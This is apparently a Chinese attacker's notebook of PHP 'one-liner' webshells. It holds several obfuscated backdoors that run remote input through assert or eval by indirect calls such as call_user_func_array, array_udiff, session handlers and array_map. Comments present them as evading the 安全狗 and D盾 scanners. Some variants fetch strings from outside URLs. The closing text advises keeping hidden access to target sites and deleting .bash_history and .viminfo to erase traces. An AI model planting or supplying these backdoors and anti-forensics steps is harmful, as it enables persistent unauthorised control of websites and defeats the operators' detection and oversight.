# php一句话

小知识点

```php
ECHO ${"_GE"."T"}['s']; # 也是get

$b = "assert"; $a = 'b'; echo $$a; #等于assert,级别为1，可疑时可以尝试用它

function # 函数,级别为1，可疑时可以尝试用它
```

```php
// 1 可疑文件
// ?id=1.assert|asd&tid=phpinfo()
function newsSearch($para0){
    $evil=$para0;
    $exec=substr($get,2,strpos($get, '|')-2);
    $get = $_GET['id'];
    call_user_func_array($exec,array($evil));
}
newsSearch($_GET['tid']);
// call_user_func_array(assert,array('phpinfo();'));

function newsSearch($para0,$para1){
    $evil=$para0;
    call_user_func_array($para1,array($evil));
}
$exec=base64_decode($_GET['id']);
newsSearch($_POST['tid'],$exec);

------------------------
// 0 完全过狗
// ?key=phpinfo()&exec=YXNzZXJ0
// php == 5.6
function newsSearch($para0,$para1){
    $evil=$para0;
    $exec=$para1;
    array_udiff($arr=array($evil) , $arr2 = array(1) ,$exec);
}
$exec=base64_decode($_REQUEST['exec']);
newsSearch($_GET['key'],$exec);
// array_udiff($arr = array(phpinfo()), $arr2 = array(1) , "assert");


-----------------------
// 0 完全过狗
// ?id=YXNzZXJ0     密码：op
// php < 7
error_reporting(0);
//$session =  //assert
function test($para){
    session_set_save_handler("open", "close", $para, "write", "destroy", "gc");
    @session_start(); // 打开会话
}
$session=base64_decode($_REQUEST['id']);
// open第一个被调用，类似类的构造函数
function open($save_path, $session_name){}
// close最后一个被调用，类似 类的析构函数
function close(){}
// 执行session_id($_REQUEST['op'])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST['op'])
session_id($_REQUEST['op']);
function write($id, $sess_data){}
function destroy($id){}
function gc(){}
// 第三个参数为read  read(string $sessionId)
test($session);

// -------------------
// 自己写的0 完全过狗简化版
// php < 7  密码id
function downloadFile($url){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    $fileName =  $ext[1];
    $fileName = rand(0,1000).$fileName;
    $file = file_get_contents($url);
    if(!isset($file)){$ary = parse_url($url);$files = basename($ary['path']);$ext = explode('.',$files);$fileName =  $ext[1];$fileName = rand(0,1000).$fileName;}
    return $file;
}
$s  = downloadFile('http://fake-blog.com/asdasfafga.txt');
$id = $_POST['id'];$URL = 'id';@$s($$URL);

// -------------------
// 自己写的0 完全过狗简化版
// php < 7  密码id
function downloadFile($url){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    // assert
    $exec1=substr($ext[0],3,1);
    $exec2=substr($ext[0],5,1);
    $exec3=substr($ext[0],5,1);
    $exec4=substr($ext[0],4,1);
    $exec5=substr($ext[0],7,2);
    $as = $exec1 . $exec2 . $exec3 . $exec4 . $exec5;
    return $as;
}
$s  = downloadFile('http://www.baidu.com/asdaesfrtafga.txt');
$id = $_GET['id'];$URL = 'id';@$s($$URL);

// -------------------
// 自己写的0 完全过狗简化版
// php 7  密码3s79kV

<?php
@error_reporting(0);
if (isset($_GET['3s79kV']))
{
    $key=substr(md5(uniqid(rand())),16);
    $skey=substr(md5(uniqid(rand())),rand(4,16));
    $_SESSION['k']=$key;
    setcookie("uid", $key.$skey);
}else{
    $skey=substr(md5(uniqid(rand())),rand(4,16));
    $a="tents";
    $b='file_'.'get_con'.$a;
    function c($p)
    {
        return eval($p."");
    }
    
    $post = $skey.'|'.$_POST['3s79kV'];
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {c($p);}}
	@new C($params);
}
?>


<?php
function downloadFile($url,$x){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    // assert
    $str=str_replace('d','',$ext[0]);
    $str=str_replace('j','',$str);
    $as[0] = $str;
    $as[1] = $x['x'];
    return $as;
}
$a = $_POST;
$s  = downloadFile('http://www.baidu.com/asdjdsejjrjtdd.txt',$a);
$b = $s[0];
$c = $s[1];
array_map($b,array($c));
```

后话
真正的后门，要靠系统层
对于 PHP 后门来说，如果能做到隐蔽性，不会被D盾等工具自动检测出来。人工查看时，一时半会儿也看不出有问题，其实就够了。

受限于运维的日志审查，通过 PHP 去进行后渗透不太现实，PHP 后门最大的意义在于，留有一个通道。等其它通道关闭或者网站迁移（总要移代码吧）时，能够维持对目标站的控制。

而真正的后渗透操作，还是要考系统层的其它技巧，比如 shift 后门，ssh 后门，注册表木马等等~这些都是后话了~

擦除痕迹
想要让后面隐蔽，除了以上几点，还要清理好文件操作的痕迹。在 Linux 下就是删除 .bash_history 和 .viminfo 的记录，这些记录显示了你前段时间执行了哪些命令，修改了哪些文本。
